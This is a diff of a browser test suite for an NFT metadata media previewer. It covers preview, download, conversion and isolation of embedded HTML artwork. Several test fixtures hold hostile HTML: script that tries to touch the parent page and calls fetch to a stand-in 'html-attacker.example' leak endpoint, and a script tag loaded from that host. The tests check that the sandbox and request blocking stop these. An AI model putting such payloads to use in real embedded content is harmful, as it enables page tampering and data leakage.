@@ -20,6 +20,10 @@ const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="10"><rec
 const htmlArtwork = '<!doctype html><meta charset="utf-8"><style>html,body{margin:0;height:100%;display:grid;place-items:center}canvas{width:100%;image-rendering:pixelated}</style><canvas width="32" height="16"></canvas><script>const c=document.querySelector("canvas"),ctx=c.getContext("2d");function frame(t){ctx.fillStyle=Math.floor(t/100)%2?"blue":"red";ctx.fillRect(0,0,32,16);ctx.fillStyle="lime";ctx.fillRect(16,0,16,16);requestAnimationFrame(frame)}requestAnimationFrame(frame);try{parent.document.body.dataset.compromised="yes"}catch{}fetch("https://html-attacker.example/leak").catch(()=>{});<\/script>';
 const htmlMetadata = { name: 'Media 5', image: `data:image/svg+xml;base64,${Buffer.from(svg).toString('base64')}`, animation_url: `data:text/html;base64,${Buffer.from(htmlArtwork).toString('base64')}` };
 const embeddedMetadata = { name: 'Media 4', image: `data:image/jpeg;base64,${fixtures.jpg.toString('base64')}`, animation_url: `data:image/gif;base64,${fixtures.gif.toString('base64')}` };
+const brokenHtml = {
+  6: '<script src="https://html-attacker.example/p5.min.js"></script>',
+  7: '<script>throw new Error("Broken artwork fixture")</script>',
+};
 let rpcCalls = 0, metadataCalls = 0, releaseSlow, slowStarted, escapedRequests = 0;
 const slowSeen = new Promise(resolve => { slowStarted = resolve; });
 const slowGate = new Promise(resolve => { releaseSlow = resolve; });
@@ -40,6 +44,7 @@ try {
       : encodeAbiParameters([{ type: 'string' }], [BigInt('0x' + data.slice(-64)) === 4n
         ? `data:application/json;base64,${Buffer.from(JSON.stringify(embeddedMetadata)).toString('base64')}`
         : BigInt('0x' + data.slice(-64)) === 5n ? `data:application/json;base64,${Buffer.from(JSON.stringify(htmlMetadata)).toString('base64')}`
+        : brokenHtml[BigInt('0x' + data.slice(-64))] ? `data:application/json,${encodeURIComponent(JSON.stringify({ name: 'Broken HTML fixture', image: `data:image/svg+xml,${encodeURIComponent(svg)}`, animation_url: `data:text/html,${encodeURIComponent(brokenHtml[BigInt('0x' + data.slice(-64))])}` }))}`
         : `${base}/${BigInt('0x' + data.slice(-64))}.json`]);
     await route.fulfill({ json: { jsonrpc: '2.0', id: request.id, result } });
   });
@@ -64,7 +69,7 @@ try {
   async function submit(id, method = 'auto') {
     await page.locator('#contract').fill(contract); await page.locator('#token').fill(String(id)); await page.locator('#method').selectOption(method);
     await page.locator('#token').press('Enter');
-    await page.waitForFunction(id => document.querySelector('#name').textContent === `Media ${id}` && !document.querySelector('#image').hidden, String(id));
+    await page.waitForFunction(id => document.querySelector('#name').textContent === `Media ${id}` && (!document.querySelector('#image').hidden || document.querySelector('#media-type').textContent === 'HTML'), String(id));
   }
   async function select(field, type) {
     await page.locator('#media-source').selectOption(field);
@@ -106,8 +111,10 @@ try {
     return output;
   }
   await submit(1);
-  assert.equal(await page.locator('#media-source').inputValue(), 'image');
+  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
+  assert.equal(await page.locator('#media-type').textContent(), 'GIF');
   assert.equal(await page.locator('#media-source option').count(), 7);
+  await select('image', 'JPEG');
   await original(fixtures.jpg, 'jpg'); await convert('jpg', false); await page.locator('#close-share-modal').click();
   const counts = [rpcCalls, metadataCalls];
   await select('animation_url', 'GIF');
@@ -156,13 +163,18 @@ try {
 
   await submit(4);
   assert.equal(await page.locator('.preview-footer #media-source').count(), 1);
+  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
+  assert.equal(await page.locator('#media-type').textContent(), 'GIF');
+  await select('image', 'JPEG');
   await original(fixtures.jpg, 'jpg'); await convert('jpg', false); await page.locator('#close-share-modal').click();
   await select('animation_url', 'GIF');
   assert.equal(await page.locator('#media-storage').getAttribute('data-location'), 'on-chain');
   await original(fixtures.gif, 'gif'); await convert('webp', true); await page.locator('#close-share-modal').click();
   console.log('PASS base64 image and animation in base64 token metadata preview, download and convert independently');
 
-  await submit(5); await select('animation_url', 'HTML');
+  await submit(5);
+  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
+  assert.equal(await page.locator('#media-type').textContent(), 'HTML');
   assert.equal(await page.locator('#html-stage iframe').getAttribute('sandbox'), 'allow-scripts');
   assert.equal(await page.evaluate(() => document.body.dataset.compromised), undefined);
   await page.locator('#fullscreen-media').click();
@@ -183,6 +195,17 @@ try {
   assert.equal(await page.locator('#html-stage iframe').count(), 0);
   assert.equal(escapedRequests, 0);
   console.log('PASS embedded HTML previews in isolation, enters fullscreen, downloads unchanged, converts changing canvas frames, and cleans up on selection');
+
+  for (const [id, message] of [[6, 'unsupported external script'], [7, 'Broken artwork fixture']]) {
+    await page.locator('#token').fill(String(id)); await page.locator('#token').press('Enter');
+    await page.waitForFunction(message => document.querySelector('#status').textContent.includes(message), message);
+    assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
+    assert.equal(await page.locator('#html-stage iframe').count(), 0);
+    await select('image', 'SVG');
+    assert.equal(await page.locator('#status').textContent(), '');
+  }
+  assert.equal(escapedRequests, 0);
+  console.log('PASS unsupported dependencies and startup errors show useful errors; selecting image recovers without external script requests');
 
   await submit(1);
   await page.setViewportSize({ width: 390, height: 844 });
